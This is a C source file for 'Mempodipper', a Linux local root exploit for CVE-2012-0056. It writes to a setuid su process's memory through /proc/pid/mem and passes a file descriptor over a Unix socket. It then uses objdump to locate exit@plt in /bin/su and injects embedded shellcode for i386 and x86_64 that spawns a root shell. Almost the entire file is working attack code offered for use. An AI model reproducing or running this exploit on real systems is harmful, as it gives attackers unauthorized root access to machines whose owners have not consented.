/* THIS CODE IS PRIVATE, NOT MEANT TO BE SHARED. */

/*
 * Mempodipper
 * Linux Local Root Exploit
 * 
 * by zx2c4
 * Jan 21, 2012
 * 
 * CVE-2012-0056
 */

#define _LARGEFILE64_SOURCE 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

char *socket_path = "/tmp/.sockpuppet";
int send_fd(int fd)
{
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	int n;
	int sock;
	char cms[CMSG_SPACE(sizeof(int))];
	
	if ((sock = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;

	buf[0] = 0;
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = CMSG_LEN(sizeof(int));

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	memmove(CMSG_DATA(cmsg), &fd, sizeof(int));

	if ((n = sendmsg(sock, &msg, 0)) != iov.iov_len)
		return -1;
	close(sock);
	return 0;
}

int recv_fd()
{
	int listener;
	int sock;
	int n;
	int fd;
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	char cms[CMSG_SPACE(sizeof(int))];

	if ((listener = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	unlink(socket_path);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;
	if (listen(listener, 1) < 0)
		return -1;
	if ((sock = accept(listener, NULL, NULL)) < 0)
		return -1;
	
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = sizeof cms;

	if ((n = recvmsg(sock, &msg, 0)) < 0)
		return -1;
	if (n == 0)
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
	close(sock);
	close(listener);
	return fd;
}

int main(int argc, char **argv)
{
	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
		char parent_mem[256];
		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
		printf("[+] Opening parent mem %s in child.\n", parent_mem);
		int fd = open(parent_mem, O_RDWR);
		if (fd < 0) {
			perror("[-] open");
			return 1;
		}
		printf("[+] Sending fd %d to parent.\n", fd);
		send_fd(fd);
		return 0;
	}
	
	printf("===============================\n");
	printf("=          Mempodipper        =\n");
	printf("=           by zx2c4          =\n");
	printf("=         Jan 21, 2012         =\n");
	printf("===============================\n\n");
	
	int parent_pid = getpid();
	if (fork()) {
		printf("[+] Waiting for transferred fd in parent.\n");
		int fd = recv_fd();
		printf("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			perror("[-] recv_fd");
			return -1;
		}
		printf("[+] Assigning fd %d to stderr.\n", fd);
		dup2(fd, 2);
/*
  Here is the asm from my /bin/su.
  At this point it returns from looking for the user name.
  It gets the error string here:
  403677:       ba 05 00 00 00          mov    $0x5,%edx
  40367c:       be ff 64 40 00          mov    $0x4064ff,%esi
  403681:       31 ff                   xor    %edi,%edi
  403683:       e8 e0 ed ff ff          callq  402468 <dcgettext@plt>
  And then writes it to stderr:
  403688:       48 8b 3d 59 51 20 00    mov    0x205159(%rip),%rdi        # 6087e8 <stderr>
  40368f:       48 89 c2                mov    %rax,%rdx
  403692:       b9 20 88 60 00          mov    $0x608820,%ecx
  403697:       be 01 00 00 00          mov    $0x1,%esi
  40369c:       31 c0                   xor    %eax,%eax
  40369e:       e8 75 ea ff ff          callq  402118 <__fprintf_chk@plt>
  Closes the log:
  4036a3:       e8 f0 eb ff ff          callq  402298 <closelog@plt>
  And then exits the program:
  4036a8:       bf 01 00 00 00          mov    $0x1,%edi
  4036ad:       e8 c6 ea ff ff          callq  402178 <exit@plt>
  
  We therefore want to use 0x402178, which is the exit function it calls.
*/
		unsigned long address;
		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
			address = strtoul(argv[2], NULL, 16);
		else {
			printf("[+] Reading su for exit@plt.\n");
			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
			FILE *command = popen("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
			char result[32];
			result[0] = 0;
			fgets(result, 32, command);
			pclose(command);
			address = strtoul(result, NULL, 16);
			if (address == ULONG_MAX || !address) {
				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
				return 1;
			}
			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
		}
		unsigned long su_padding = strlen("Unknown id: ");
		unsigned long offset = address - su_padding;
		printf("[+] Seeking to offset 0x%lx.\n", offset);
		lseek64(fd, offset, SEEK_SET);
		
#if defined(__i386__)
		// Shellcode from: http://www.shell-storm.org/shellcode/files/shellcode-599.php
		char shellcode[] =
			"\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f"
			"\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
#elif defined(__x86_64__)
		// Shellcode from: http://www.shell-storm.org/shellcode/files/shellcode-77.php
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
			"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
			"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
			"\x58\x0f\x05";
#else
#error "That platform is not supported."
#endif
		printf("[+] Executing su with shellcode. There will be no prompt, so just type commands.\n");
		execl("/bin/su", "su", shellcode, NULL);
	} else {
		sleep(0.01);
		char pid[32];
		sprintf(pid, "%d", parent_pid);
		printf("[+] Executing child from child fork.\n");
		execl("/proc/self/exe", argv[0], "-c", pid, NULL);
	}
}
